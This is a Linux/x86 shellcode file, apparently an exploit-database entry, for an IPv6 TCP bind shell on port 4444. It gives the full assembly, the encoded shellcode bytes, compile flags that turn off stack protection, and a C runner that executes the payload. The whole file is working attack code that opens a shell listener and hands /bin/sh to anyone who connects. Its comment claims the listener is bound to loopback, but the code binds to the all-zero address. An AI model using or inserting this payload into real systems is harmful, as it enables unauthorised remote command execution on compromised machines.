// # Title: Linux/x86 - IPv6 TCP bind tcp shell on 4444 port
// # Length : 113 bytes
// # Author : Matteo Malvica
// # Tested On : kali linux 4.15
// # Contact : matteo@malvica.com
// # Description: it creates an IPv6 socket on localhost ::1 and listens on port 4444

/*

global _start
section .text

_start:

;; ipv6 socket creation
push  0x6   	; protocol IPv6
push  0x1 	  	; socket_type=SOCK_STREAM (0x1)
push  0xa		; AF_INET6
xor eax,eax		; zero out eax
xor ebx,ebx		; zero out ebx
mov al,0x66  	; syscall: sys_socketcall + cleanup eax register
inc ebx		 	; 1 = SYS_socket
mov ecx,esp 	; save pointer (ESP) to socket() args (ECX)
int 0x80
mov esi,eax 	; saves socket descriptor
xor eax,eax

;;bind
push DWORD eax 		;ipv6 loopback pushed as x4 dword
push DWORD eax
push DWORD eax
push DWORD eax
push DWORD eax  	;sin6_addr
push WORD 0x5c11	;port 4444
push WORD 0x0a		;AF_INET6
mov ecx,esp
push 0x1c
push ecx
push esi
dec ebx
mov bl,0x2
mov ecx,esp
mov al,0x66
int 80h

;;listen
xor eax,eax
xor ebx,ebx
push byte 0x2
push esi
mov ecx,esp
mov bl,0x4
mov al,0x66
int 80h

;;accept
xor ebx,ebx
push ebx
push ebx
push esi
mul ebx
mov bl,0x5
mov al,0x66
mov ecx,esp
int 80h

sub ecx, ecx
mov cl, 0x2 ;initiate counter
xchg ebx,eax ;save clientfd

; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop2:
	mov al, 0x3f ;syscall: sys_dup2
	int 0x80     ;exec sys_dup2
	dec ecx      ;decrement loop-counter
	jns loop2    ;as long as SF is not set -> jmp to loop

;;execve(/bin//sh)
xor edx,edx
push edx ;null terminated /bin//sh
push 0x68732f2f ;"hs//"
push 0x6e69622f ;"nib/"
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0x0b ;execve()
int 0x80

*/

/*
to compile the shellcode

$gcc -m32  -fno-stack-protector -z execstack shellcode.c -o shellcode
$./shellcode

*/


#include <stdio.h>

unsigned char shellcode[] = \
"\x6a\x06\x6a\x01\x6a\x0a\x31\xc0\x31\xdb\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x50\x50\x50\x50\x50\x66\x68\x11\x5c\x66\x6a\x0a\x89\xe1\x6a\x1c\x51\x56\x4b\xb3\x02\x89\xe1\xb0\x66\xcd\x80\x31\xc0\x31\xdb\x6a\x02\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xdb\x53\x53\x56\xf7\xe3\xb3\x05\xb0\x66\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";


main()
{
	printf("Shellcode Length:  %d\n", sizeof(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	ret();
}